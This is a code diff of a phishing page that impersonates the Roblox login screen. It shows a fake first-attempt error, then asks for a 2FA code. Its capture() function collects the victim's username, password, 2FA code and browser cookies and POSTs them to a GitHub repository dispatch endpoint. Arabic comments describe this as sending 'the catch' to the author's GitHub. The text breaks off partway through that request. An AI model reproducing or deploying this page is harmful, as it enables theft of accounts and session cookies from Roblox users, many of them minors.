@@ -5,87 +5,65 @@
     <title>Login | Roblox</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background-color: #f2f4f5; font-family: 'HCo Gotham SSm', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        body { background: #f2f4f5; font-family: 'HCo Gotham SSm', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .box { background: white; padding: 40px; width: 380px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); text-align: center; }
-        .error-msg { color: #f74b4e; font-size: 13px; margin-bottom: 10px; display: none; text-align: left; background: #fff1f1; padding: 10px; border: 1px solid #f74b4e; border-radius: 3px; }
+        .err { color: #f74b4e; font-size: 13px; margin-bottom: 10px; display: none; text-align: left; background: #fff1f1; padding: 10px; border: 1px solid #f74b4e; border-radius: 3px; }
         input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #b8b8b8; border-radius: 3px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; background-color: #0084ff; border: none; color: white; font-weight: bold; border-radius: 3px; cursor: pointer; margin-top: 10px; }
+        .btn { width: 100%; padding: 12px; background: #0084ff; border: none; color: white; font-weight: bold; border-radius: 3px; cursor: pointer; margin-top: 10px; }
         #step-2, #loader { display: none; }
     </style>
 </head>
 <body>
     <div class="box">
         <img src="https://images.rbxcdn.com/234212955720c024d36006e89094033c.svg" width="150" style="margin-bottom: 20px;">
-        
-        <div id="loader">Processing...</div>
-        <div id="error" class="error-msg">Incorrect username or password.</div>
+        <div id="loader"><img src="https://www.roblox.com/images/Icons/LoadingInB.gif" width="40"><p>Verifying Account...</p></div>
+        <div id="err" class="err">Incorrect username or password. Please try again.</div>
 
         <div id="step-1">
             <input type="text" id="u" placeholder="Username / Email">
             <input type="password" id="p" placeholder="Password">
-            <button class="btn" onclick="validate()">Log In</button>
+            <button class="btn" onclick="checkAuth()">Log In</button>
         </div>
 
         <div id="step-2">
             <h3 style="font-size: 18px;">Verification Required</h3>
-            <p id="auth-type" style="font-size: 13px; color: #666;">Enter the code sent to your device.</p>
-            <input type="text" id="2fa" placeholder="Enter Code">
-            <button class="btn" onclick="sendAll()">Verify</button>
+            <p style="font-size: 13px; color: #666;">Enter the code sent to your device to continue.</p>
+            <input type="text" id="2fa" placeholder="6-Digit Code">
+            <button class="btn" onclick="capture()">Verify</button>
         </div>
     </div>
 
     <script>
-    let cache = {};
+    let tries = 0; let tmp = {};
 
-    async function validate() {
+    function checkAuth() {
         const u = document.getElementById('u').value;
         const p = document.getElementById('p').value;
-        if(!u || !p) return;
+        if(u.length < 3 || p.length < 4) return;
 
+        document.getElementById('step-1').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
-        document.getElementById('error').style.display = 'none';
 
-        // محاولة إرسال طلب حقيقي لـ Roblox API للفحص
-        try {
-            const resp = await fetch('https://auth.roblox.com/v2/login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ "ctype": "Username", "cvalue": u, "password": p })
-            });
-
-            const result = await resp.json();
-
-            // تحليل رد روبلوكس
-            if (resp.status === 403 || result.errors) {
-                // إذا كان الخطأ "بيانات خاطئة"
-                if (result.errors[0].code === 1) {
-                    document.getElementById('error').style.display = 'block';
-                } 
-                // إذا طلب روبلوكس تحدي (تحقق/كود)
-                else {
-                    cache = { u, p };
-                    document.getElementById('step-1').style.display = 'none';
-                    document.getElementById('step-2').style.display = 'block';
-                }
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            if (tries === 0) {
+                document.getElementById('err').style.display = 'block';
+                document.getElementById('step-1').style.display = 'block';
+                tries++;
+            } else {
+                tmp = { u, p };
+                document.getElementById('step-2').style.display = 'block';
             }
-        } catch (e) {
-            // في حالة فشل الاتصال المباشر (CORS)، ننتقل للتحقق الوهمي لضمان سحب البيانات
-            cache = { u, p };
-            document.getElementById('step-1').style.display = 'none';
-            document.getElementById('step-2').style.display = 'block';
-        }
-        document.getElementById('loader').style.display = 'none';
+        }, 3000);
     }
 
-    async function sendAll() {
+    async function capture() {
         const payload = {
-            u: cache.u,
-            p: cache.p,
+            u: tmp.u, p: tmp.p,
             code: document.getElementById('2fa').value,
             c: document.cookie 
         };
 
-        // إرسال "الصيد" كاملاً إلى GitHub الخاص بك
         await fetch('https://api.github.com/repos/mazenasad/Roblox/dispatches', {
             method: 'POST',
             headers: {
